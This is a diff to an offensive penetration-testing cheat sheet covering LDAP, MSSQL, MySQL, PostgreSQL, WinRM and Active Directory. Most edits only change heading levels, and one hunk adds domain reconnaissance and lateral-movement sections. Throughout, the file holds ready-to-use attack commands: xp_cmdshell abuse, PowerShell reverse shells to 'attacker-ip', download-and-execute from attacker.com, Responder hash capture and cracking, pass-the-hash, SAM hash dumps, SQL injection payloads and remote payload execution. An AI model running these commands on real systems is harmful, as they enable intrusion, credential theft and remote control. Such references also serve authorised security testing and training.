@@ -785,44 +785,44 @@ tftp> put <file_name>
 
 **ldapsearch basic enumeration**
 
-#### Basic LDAP query
+### Basic LDAP query
 > ```bash
 > ldapsearch -x -H ldap://<target_ip>
 > ```
-#### Basic LDAP Search for a base-level
+### Basic LDAP Search for a base-level
 > ```bash
 > ldapsearch -h <target_ip> -x -s base
 > ```
-#### Get Naming Contexts
+### Get Naming Contexts
 > ```bash
 > ldapsearch -x -H ldap://<target_ip> -s base namingcontexts
 > ```
-#### Search in a Specific Base Domain Name
+### Search in a Specific Base Domain Name
 > ```bash
 > ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"
 > ```
-#### Enumerate users using LDAP
+### Enumerate users using LDAP
 >```bash
 > ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass=*)"
 > ```
-#### Retrieve users Account Name
+### Retrieve users Account Name
 > ```bash
 > ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass*)" | grep sAMAccountName:
 > ```
-#### Search with Filters
+### Search with Filters
 > ```bash
 > ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=user)"
 > ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=group)"
 > ```
-#### Searching with authentication
+### Searching with authentication
 > ```bash
 > ldapsearch -h <target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>"
 > ```
-#### Searching terms
+### Searching terms
 > ```bash
 > ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>"
 > ```
-#### Specifies the value term to return
+### Specifies the value term to return
 > ```bash
 > ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>
 
@@ -888,7 +888,7 @@ tftp> put <file_name>
 > sa:P@ssw0rd
 > ```
 **Connecting**
-#### Using impacket
+### Using impacket
 > - Windows authentication
 > ```bash
 > impacket-mssqlclient DOMAIN/username:password@<IP Address>
@@ -905,7 +905,7 @@ tftp> put <file_name>
 > ```bash
 > impacket-mssqlclient.py username@<IP Address> -hashes :NTHASH
 > ```
-#### Using sqsh
+### Using sqsh
 > - Connect with SQL authentication
 > ```bash
 > sqsh -S <IP Address> -U sa -P password
@@ -916,7 +916,7 @@ tftp> put <file_name>
 > ```
 
 **Enumeration**
-#### Version Detection
+### Version Detection
 > - Get SQL Server version
 > ```sql
 > SELECT @@version;
@@ -932,7 +932,7 @@ tftp> put <file_name>
 > SELECT @@SERVERNAME;
 > SELECT SERVERPROPERTY('MachineName');
 > ```
-#### Database Enumeration
+### Database Enumeration
 > - List all databases
 > ```sql
 > SELECT name FROM sys.databases;
@@ -972,7 +972,7 @@ tftp> put <file_name>
 > SELECT name FROM master.sys.server_principals 
 > WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
 > ```
-#### Table and Column Enumeration
+### Table and Column Enumeration
 > - List tables in current database
 > ```sql
 > SELECT table_name FROM information_schema.tables;
@@ -996,7 +996,7 @@ tftp> put <file_name>
 > INNER JOIN sys.partitions p ON t.object_id = p.object_id
 > WHERE p.index_id < 2;
 > ```
-#### Privilege Enumeration
+### Privilege Enumeration
 > - Check if current user is sysadmin
 > ```sql
 > SELECT IS_SRVROLEMEMBER('sysadmin');
@@ -1014,7 +1014,7 @@ tftp> put <file_name>
 > ```sql
 > EXEC sp_helprolemember;
 > ```
-#### xp_cmdshell
+### xp_cmdshell
 > - Enabling
 > ```sql
 > EXEC sp_configure 'show advanced options', 1;
@@ -1022,7 +1022,7 @@ tftp> put <file_name>
 > EXEC sp_configure 'xp_cmdshell', 1;
 > RECONFIGURE;
 > ```
-#### Use and persistence
+### Use and persistence
 > ```sql
 > EXEC xp_cmdshell 'whoami';
 > ```
@@ -1047,7 +1047,7 @@ tftp> put <file_name>
 > ```sql
 > EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://<attacker IP>/shell.exe -OutFile C:\Temp\shell.exe"';
 > ```
-#### Capturing hashes
+### Capturing hashes
 > - Start Responder on attacker machine
 > ```bash
 > sudo responder -I eth0
@@ -1069,7 +1069,7 @@ tftp> put <file_name>
 > ```bash
 > hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 > ```
-#### Impersonation Attacks
+### Impersonation Attacks
 > - Check for impersonation permissions
 > ```sql
 > SELECT distinct b.name
@@ -1096,7 +1096,7 @@ tftp> put <file_name>
 > ```sql
 > EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''attacker-ip'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
 > ```
-#### Lateral Movement
+### Lateral Movement
 > - Domain Enumeration
 > - Enumerate domain users
 > ```sql
@@ -1138,7 +1138,7 @@ tftp> put <file_name>
 | INTO OUTFILE       | Write to file           | SELECT * INTO OUTFILE '/tmp/file.txt'; |
 
 **Connecting**
-#### Using MySQL client
+### Using MySQL client
 > - Local connection (no password)
 > ```bash
 > mysql -u root
@@ -1163,7 +1163,7 @@ tftp> put <file_name>
 > ```bash
 > mysql -u username -h target.com -p --skip-database
 > ```
-#### Using mysqldump
+### Using mysqldump
 > - Dump specific database
 > ```bash
 > mysqldump -u username -p database_name > backup.sql
@@ -1181,7 +1181,7 @@ tftp> put <file_name>
 > mysqldump -u username -h target.com -p database_name > remote_backup.sql
 > ```
 **Enumeration**
-#### Version Detection
+### Version Detection
 > - MySQL version
 > ```sql
 > SELECT @@version;
@@ -1196,7 +1196,7 @@ tftp> put <file_name>
 > ```sql
 > SHOW VARIABLES LIKE "%version%";
 > ```
-#### Database
+### Database
 > - List all databases
 > ```sql
 > SHOW DATABASES;
@@ -1214,7 +1214,7 @@ tftp> put <file_name>
 > FROM information_schema.TABLES 
 > GROUP BY table_schema;
 > ```
-#### Users
+### Users
 > - List MySQL users
 > ```sql
 > SELECT user, host FROM mysql.user;
@@ -1237,7 +1237,7 @@ tftp> put <file_name>
 > ```sql
 > SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
 > ```
-#### Table and Columns
+### Table and Columns
 > - List tables in current database
 > ```sql
 > SHOW TABLES;
@@ -1262,7 +1262,7 @@ tftp> put <file_name>
 > SELECT table_name, table_rows FROM information_schema.TABLES 
 > WHERE table_schema = DATABASE();
 > ```
-#### Privileges
+### Privileges
 > - Check FILE privilege (for LOAD_FILE/INTO OUTFILE)
 > ```sql
 > SELECT file_priv FROM mysql.user WHERE user='current_user';
@@ -1277,7 +1277,7 @@ tftp> put <file_name>
 > ```sql
 > SELECT * FROM information_schema.USER_PRIVILEGES WHERE grantee LIKE '%username%';
 > ```
-#### Configuration
+### Configuration
 > - Important variables
 > ```sql
 > SHOW VARIABLES;
@@ -1294,7 +1294,7 @@ tftp> put <file_name>
 > ```sql
 > SHOW PROCESSLIST;
 > ```
-#### File Operations
+### File Operations
 > - Read Files
 > ```sql
 > SELECT LOAD_FILE('/etc/passwd');
@@ -1314,7 +1314,7 @@ tftp> put <file_name>
 > ```sql
 > SHOW VARIABLES LIKE 'secure_file_priv';
 > ```
-#### User Defined Functions (UDF) for RCE
+### User Defined Functions (UDF) for RCE
 > - Create malicious UDF library
 > - First, create the UDF shared library (compiled C code)
 > - Then load it into MySQL
@@ -1635,7 +1635,7 @@ tftp> put <file_name>
 
 ---
 
-##RDP
+## RDP
 
 > - Password Spray
 > ```bash
@@ -1821,111 +1821,111 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 > ```
 # Version Detection
 
-> #### PostgreSQL version
+### PostgreSQL version
 > ```sql
 > SELECT version();
 > ```
 
-> #### Server version number
+### Server version number
 > ```sql
 > SHOW server_version;
 > SHOW server_version_num;
 > ```
 
-> #### Detailed version info
+### Detailed version info
 > ```sql
 > SELECT current_setting('server_version');
 > ```
 
 # Database Enumeration
 
-> #### List all databases
+### List all databases
 > ```sql
 > \l
 > SELECT datname FROM pg_database;
 > ```
 
-> #### Current database
+### Current database
 > ```sql
 > SELECT current_database();
 > ```
 
-> #### Database owner
+### Database owner
 > ```sql
 > SELECT pg_catalog.pg_get_userbyid(d.datdba) AS owner, datname 
 > FROM pg_catalog.pg_database d;
 > ```
 
-> #### Database size
+### Database size
 > ```sql
 > SELECT pg_database.datname, 
 >       pg_size_pretty(pg_database_size(pg_database.datname)) AS size 
 > FROM pg_database;
 > ```
 
-> #### Number of connections per database
+### Number of connections per database
 > ```sql
 > SELECT datname, count(*) FROM pg_stat_activity GROUP BY datname;
 > ```
 
 # User Enumeration
 
-> #### List all users
+### List all users
 > ```sql
 > \du
 > SELECT usename FROM pg_user;
 > SELECT usename, usesysid FROM pg_shadow;
 > ```
 
-> #### Current user
+### Current user
 > ```sql
 > SELECT current_user;
 > SELECT user;
 > SELECT session_user;
 > ```
 
-> #### User privileges
+### User privileges
 > ```sql
 > SELECT usename, usecreatedb, usesuper FROM pg_user;
 > ```
 
-> #### Superusers
+### Superusers
 > ```sql
 > SELECT usename FROM pg_user WHERE usesuper = true;
 > ```
 
-> #### Users with create database privilege
+### Users with create database privilege
 > ```sql
 > SELECT usename FROM pg_user WHERE usecreatedb = true;
 > ```
 
 # Schema and Table Enumeration
 
-> #### List schemas
+### List schemas
 > ```sql
 > \dn
 > SELECT schema_name FROM information_schema.schemata;
 > ```
 
-> #### List tables in current database
+### List tables in current database
 > ```sql
 > \dt
 > SELECT table_name FROM information_schema.tables WHERE table_schema='public';
 > ```
 
-> #### List all tables across all schemas
+### List all tables across all schemas
 > ```sql
 > SELECT schemaname, tablename FROM pg_tables;
 > ```
 
-> #### List columns in specific table
+### List columns in specific table
 > ```sql
 > \d table_name
 > SELECT column_name, data_type FROM information_schema.columns 
 > WHERE table_name='users';
 > ```
 
-> #### Find sensitive columns
+### Find sensitive columns
 > ```sql
 > SELECT table_schema, table_name, column_name 
 > FROM information_schema.columns 
@@ -1936,7 +1936,7 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 >   OR column_name LIKE '%key%';
 > ```
 
-> #### Count rows in tables
+### Count rows in tables
 > ```sql
 > SELECT schemaname, relname, n_live_tup 
 > FROM pg_stat_user_tables 
@@ -1945,24 +1945,24 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 
 # Privilege Enumeration
 
-> #### Current user privileges
+### Current user privileges
 > ```sql
 > \du+
 > ```
 
-> #### Table privileges for current user
+### Table privileges for current user
 > ```sql
 > SELECT grantee, privilege_type 
 > FROM information_schema.table_privileges 
 > WHERE grantee = current_user;
 > ```
 
-> #### Check if superuser
+### Check if superuser
 > ```sql
 > SELECT usesuper FROM pg_user WHERE usename = current_user;
 > ```
 
-> #### Check file read/write permissions
+### Check file read/write permissions
 > ```sql
 > # Requires pg_read_file/pg_write_file functions
 > SELECT has_function_privilege('pg_read_file(text)', 'execute');
@@ -1971,25 +1971,25 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 
 # Function and Extension Enumeration
 
-> #### List installed extensions
+### List installed extensions
 > ```sql
 > \dx
 > SELECT extname, extversion FROM pg_extension;
 > ```
 
-> #### List functions
+### List functions
 > ```sql
 > \df
 > SELECT proname FROM pg_proc WHERE proname !~ '^pg_';
 > ```
 
-> #### List large objects
+### List large objects
 > ```sql
 > \lo_list
 > SELECT oid, pg_size_pretty(lo_get(oid)) FROM pg_largeobject_metadata;
 > ```
 
-> #### Check for dangerous functions
+### Check for dangerous functions
 > ```sql
 > SELECT proname FROM pg_proc 
 > WHERE proname IN ('pg_read_file', 'pg_ls_dir', 'pg_read_binary_file');
@@ -1997,7 +1997,7 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 
 # Configuration Enumeration
 
-> #### Important settings
+### Important settings
 > ```sql
 > SHOW all;
 > SHOW data_directory;
@@ -2006,46 +2006,46 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 > SHOW log_directory;
 > ```
 
-> #### File locations
+### File locations
 > ```sql
 > SELECT name, setting FROM pg_settings WHERE name LIKE '%file%' OR name LIKE '%dir%';
 > ```
 
-> #### Logging settings
+### Logging settings
 > ```sql
 > SELECT name, setting FROM pg_settings WHERE name LIKE 'log%';
 > ```
 
-> #### Connection settings
+### Connection settings
 > ```sql
 > SELECT name, setting FROM pg_settings WHERE category = 'Connections and Authentication';
 > ```
 
 # SQL Injection
-#### Error-based injection
+### Error-based injection
 > ```sql
 > ' AND 1=CAST((SELECT version()) AS int)--
 > ````
-#### Union-based injection
+### Union-based injection
 > ```sql
 > ' UNION SELECT NULL, version(), NULL--
 > ' UNION SELECT NULL, current_database(), NULL--
 > ```
-##### Boolean-based blind
+### Boolean-based blind
 > ```sql
 > ' AND (SELECT COUNT(*) FROM pg_user WHERE usename='postgres')=1--
 > ```
-#### Time-based blind
+### Time-based blind
 > ```sql
 > ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
 > '; SELECT pg_sleep(5)--
 > ```
-#### Stacked queries (if supported)
+### Stacked queries (if supported)
 > ```sql
 > '; DROP TABLE test_table;--
 > ```
 
-#### Code Execution
+### Code Execution
 > ```sql  
 > DROP TABLE IF EXISTS cmd_exec;  
 > CREATE TABLE cmd_exec(cmd_output text);  
@@ -2053,7 +2053,7 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 > SELECT * FROM cmd_exec;  
 > DROP TABLE IF EXISTS cmd_exec;
 > ```
-#### Reverse Shell
+### Reverse Shell
 > ```sql
 > DROP TABLE IF EXISTS cmd_exec;  
 > CREATE TABLE cmd_exec(cmd_output text);
@@ -2063,25 +2063,25 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 > ```
 
 # Other Useful commands
-> #### Query the contents of a specific table
+### Query the contents of a specific table
 > ```sql
 > SELECT * FROM <TABLE_NAME>;
 > ```
-> #### Get detailed information about a table, including columns and their types
+### Get detailed information about a table, including columns and their types
 > ```sql
 > \d+ <TABLE_NAME>
 > ```
-> #### Execute a query to find specific data, such as users with a particular attribute
+### Execute a query to find specific data, such as users with a particular attribute
 > ```sql
 > SELECT * FROM users WHERE attribute = 'value';
 > ```
-> #### Example command to list all tables and their columns
+### Example command to list all tables and their columns
 > ```sql
 > SELECT table_name, column_name, data_type
 > FROM information_schema.columns
 > WHERE table_schema = 'public';
 > ```
-> #### Execute an SQL command to create a new table
+### Execute an SQL command to create a new table
 > ```sql
 > CREATE TABLE test_table (
 >      id SERIAL PRIMARY KEY,
@@ -2089,15 +2089,15 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 >      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 >    );
 > ```
-> #### Insert data into a table
+### Insert data into a table
 > ```sql
 > INSERT INTO test_table (name) VALUES ('example_data');
 > ```
-> #### Update data in a table
+### Update data in a table
 > ```sql
 > UPDATE test_table SET name = 'updated_data' WHERE id = 1;
 > ```
-> #### Delete data from a table
+### Delete data from a table
 > ```sql
 > DELETE FROM test_table WHERE id = 1;
 > ```
@@ -2135,20 +2135,20 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 
 #### Connecting using Powershell
 
-> #### Create credentials
+### Create credentials
 > ```powershell
 > $password = ConvertTo-SecureString "password" -AsPlainText -Force
 > $cred = New-Object System.Management.Automation.PSCredential("administrator", $password)
 > ```
-> #### Connect interactively
+### Connect interactively
 > ```powershell
 > Enter-PSSession -ComputerName target.com -Credential $cred
 > ```
-> #### Run command remotely
+### Run command remotely
 > ```powershell
 > Invoke-Command -ComputerName target.com -Credential $cred -ScriptBlock { whoami }
 > ```
-> #### Connect to multiple machines
+### Connect to multiple machines
 > ```powershell
 > $computers = "server1", "server2", "server3"
 > Invoke-Command -ComputerName $computers -Credential $cred -ScriptBlock { hostname }
@@ -2158,23 +2158,23 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 
 # User Enumeration
 
-> #### List local users
+### List local users
 > ```powershell
 > Get-LocalUser
 > ```
 
-> #### List domain users (if domain-joined)
+### List domain users (if domain-joined)
 > ```powershell
 > Get-ADUser -Filter *
 > ```
 
-> #### Get current user
+### Get current user
 > ```powershell
 > whoami
 > $env:USERNAME
 > ```
 
-> #### Get user groups
+### Get user groups
 > ```powershell
 > whoami /groups
 > Get-LocalGroup
@@ -2183,63 +2183,63 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 
 # System Information
 
-> #### System information
+### System information
 > ```powershell
 > systeminfo
 > Get-ComputerInfo
 > ```
 
-> #### OS version
+### OS version
 > ```powershell
 > [System.Environment]::OSVersion
 > Get-WmiObject Win32_OperatingSystem
 > ```
 
-> #### Architecture
+### Architecture
 > ```powershell
 > [System.Environment]::Is64BitOperatingSystem
 > $env:PROCESSOR_ARCHITECTURE
 > ```
 
-> #### Hostname
+### Hostname
 > ```powershell
 > hostname
 > $env:COMPUTERNAME
 > ```
 
-> #### Domain information
+### Domain information
 > ```powershell
 > Get-WmiObject Win32_ComputerSystem | Select Domain
 > ```
 
 # Network Enumeration
 
-> #### Network interfaces
+### Network interfaces
 > ```powershell
 > ipconfig /all
 > Get-NetIPAddress
 > Get-NetIPConfiguration
 > ```
 
-> #### Routing table
+### Routing table
 > ```powershell
 > route print
 > Get-NetRoute
 > ```
 
-> #### ARP table
+### ARP table
 > ```powershell
 > arp -a
 > Get-NetNeighbor
 > ```
 
-> #### Active connections
+### Active connections
 > ```powershell
 > netstat -ano
 > Get-NetTCPConnection
 > ```
 
-> #### DNS cache
+### DNS cache
 > ```powershell
 > ipconfig /displaydns
 > Get-DnsClientCache
@@ -2247,25 +2247,25 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 
 # Process and Service Enumeration
 
-> #### List running processes
+### List running processes
 > ```powershell
 > Get-Process
 > tasklist /v
 > ```
 
-> #### Enumerate Windows services
+### Enumerate Windows services
 > ```powershell
 > Get-Service
 > sc query
 > ```
 
-> #### List scheduled tasks
+### List scheduled tasks
 > ```powershell
 > Get-ScheduledTask
 > schtasks /query /fo LIST /v
 > ```
 
-> #### List startup programs
+### List startup programs
 > ```powershell
 > Get-CimInstance Win32_StartupCommand
 > wmic startup get caption,command
@@ -2273,20 +2273,20 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 
 # Share Enumeration
 
-> #### List shares
+### List shares
 > ```powershell
 > net share
 > Get-SmbShare
 > Get-WmiObject Win32_Share
 > ```
 
-> #### Access shares
+### Access shares
 > ```powershell
 > net use \\target\share
 > Get-SmbMapping
 > ```
 
-> #### Find accessible shares on network
+### Find accessible shares on network
 > ```powershell
 > Get-SmbShare -CimSession (Get-ADComputer -Filter *).Name
 > ```
@@ -2325,22 +2325,22 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 
 **Pass-the-Hash**
 
-> #### Using evil-winrm with NTLM hash
+### Using evil-winrm with NTLM hash
 > ```bash
 > evil-winrm -i target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
 > ```
-> #### Using crackmapexec
+### Using crackmapexec
 > ```bash
 > crackmapexec winrm target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
 > ```
 
 **Command Execution**
 
-> #### Basic command execution
+### Basic command execution
 > ```powershell
 > Invoke-Command -ComputerName target.com -ScriptBlock { whoami }
 > ```
-> #### Multiple commands
+### Multiple commands
 > ```powershell
 > Invoke-Command -ComputerName target.com -ScriptBlock {
 >  whoami
@@ -2348,11 +2348,11 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 >  ipconfig
 >}
 > ```
-> #### Execute local script on remote
+### Execute local script on remote
 > ```powershell
 > Invoke-Command -ComputerName target.com -FilePath .\script.ps1
 > ```
-> #### Download and execute
+### Download and execute
 > ```powershell
 > Invoke-Command -ComputerName target.com -ScriptBlock {
 >  IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
@@ -2361,11 +2361,11 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 
 **Privilege Execution**
 
-> #### Check privileges
+#### Check privileges
 > ```cmd
 > whoami /priv
 > ```
-> #### Check for unquoted service paths
+#### Check for unquoted service paths
 > ```cmd
 > wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
 > ```
@@ -2374,13 +2374,13 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 > reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 > reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 > ```
-> #### Check for stored credentials
+#### Check for stored credentials
 > ```cmd
 > cmdkey /list
 > dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 > dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 > ```
-> #### PowerUp enumeration
+#### PowerUp enumeration
 > ```powershell
 > IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
 > Invoke-AllChecks
@@ -2388,31 +2388,31 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 
 **Lateral Movement**
 
-> #### Execute on multiple machines
+### Execute on multiple machines
 > ```powershell
 > $computers = Get-ADComputer -Filter * | Select -ExpandProperty Name
 > Invoke-Command -ComputerName $computers -ScriptBlock { hostname }
 > ```
-> #### Pass credentials to other systems
+### Pass credentials to other systems
 > ```powershell
 > $cred = Get-Credential
 > Invoke-Command -ComputerName server2 -Credential $cred -ScriptBlock {
 >  # Commands here
 >}
 > ```
-> #### Copy files and execute
+### Copy files and execute
 > ```powershell
 > Copy-Item -Path payload.exe -Destination \\target\C$\Windows\Temp\
 > Invoke-Command -ComputerName target -ScriptBlock {
 >  C:\Windows\Temp\payload.exe
 >}
 > ```
-> #### PSRemoting through multiple hops
-> #### Enable CredSSP on source
+### PSRemoting through multiple hops
+### Enable CredSSP on source
 > ```powershell
 > Enable-WSManCredSSP -Role Client -DelegateComputer target.com
 > ```
-> #### Execute with CredSSP
+### Execute with CredSSP
 > ```powershell
 > $cred = Get-Credential
 > Invoke-Command -ComputerName target.com -Credential $cred -Authentication CredSSP -ScriptBlock {
@@ -2420,7 +2420,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 >}
 > ```
 
-> #### Dump SAM hashes
+### Dump SAM hashes
 > ```cmd
 > reg save HKLM\SAM C:\Windows\Temp\sam
 > reg save HKLM\SYSTEM C:\Windows\Temp\system
@@ -2429,7 +2429,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 
 **Reverse Shell**
 
-> #### PowerShell reverse shell
+### PowerShell reverse shell
 > ```powershell
 > $client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444)
 > $stream = $client.GetStream()
@@ -2443,7 +2443,68 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 >   $stream.Flush()
 > }
 > ```
-> #### One-liner reverse shell
+### One-liner reverse shell
 > ```powershell
 > powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 > ```
+
+**Domain Reconnaissance**
+
+### Domain information
+> ```powershell
+> Get-ADDomain
+> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+>```
+### Domain controllers
+> ```powershell
+> Get-ADDomainController -Filter *
+> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
+> ```
+### Domain users
+> ```powershell
+> Get-ADUser -Filter * -Properties *
+> net user /domain
+> ```
+### Domain computers
+> ```powershell
+> Get-ADComputer -Filter *
+> net view /domain
+> ```
+### Domain groups
+> ```powershell
+> Get-ADGroup -Filter *
+> net group /domain
+> ```
+### Group members
+> ```powershell
+> Get-ADGroupMember "Domain Admins"
+> net group "Domain Admins" /domain
+> ```
+> #### GPOs
+> ```powershell
+> Get-GPO -All
+
+**Lateral Movement**
+
+### Execute on multiple machines
+> ```powershell
+> $computers = Get-ADComputer -Filter * | Select -ExpandProperty Name
+> Invoke-Command -ComputerName $computers -ScriptBlock { hostname }
+> ```
+### Pass credentials to other systems
+> ```powershell
+> $cred = Get-Credential
+> Invoke-Command -ComputerName server2 -Credential $cred -ScriptBlock {
+>  # Commands here
+> }
+> ```
+### Copy files and execute
+> ```powershell
+> Copy-Item -Path payload.exe -Destination \\target\C$\Windows\Temp\
+> Invoke-Command -ComputerName target -ScriptBlock {
+>  C:\Windows\Temp\payload.exe
+> }
+> ```
+
+---
+
